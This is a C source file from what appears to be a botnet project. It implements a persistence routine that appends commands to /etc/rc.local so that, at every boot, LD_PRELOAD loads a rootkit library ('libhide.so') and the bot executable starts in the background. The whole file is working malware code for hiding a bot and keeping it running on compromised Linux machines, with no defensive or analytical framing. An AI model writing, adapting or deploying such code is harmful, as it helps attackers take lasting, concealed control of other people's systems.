#include "../../include/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <libgen.h>

#define RC_LOCAL_PATH "/etc/rc.local"
#define ROOTKIT_LIB_NAME "libhide.so"

// Establishes persistence and activates the rootkit
void persistence_establish() {
    char self_path[1024];
    ssize_t len = readlink("/proc/self/exe", self_path, sizeof(self_path) - 1);
    if (len == -1) return; // Cannot get own path
    self_path[len] = '\0';

    // Get the directory where the bot is running
    char *self_dir = dirname(self_path);
    char rootkit_path[2048];
    snprintf(rootkit_path, sizeof(rootkit_path), "%s/%s", self_dir, ROOTKIT_LIB_NAME);

    FILE *fp = fopen(RC_LOCAL_PATH, "a+");
    if (fp == NULL) return; // Cannot open rc.local

    // Check if our rootkit is already loaded
    char line[2048];
    int already_exists = 0;
    rewind(fp);
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, rootkit_path)) {
            already_exists = 1;
            break;
        }
    }

    if (!already_exists) {
        printf("[*] Establishing persistence with rootkit...\n");
        // Add the commands to load the rootkit and start the bot
        fprintf(fp, "\n# Activate stealth module and start bot\n");
        fprintf(fp, "export LD_PRELOAD=%s\n", rootkit_path);
        fprintf(fp, "%s &\n", self_path);
        printf("[+] Rootkit and persistence established in %s\n", RC_LOCAL_PATH);
    }

    fclose(fp);
}
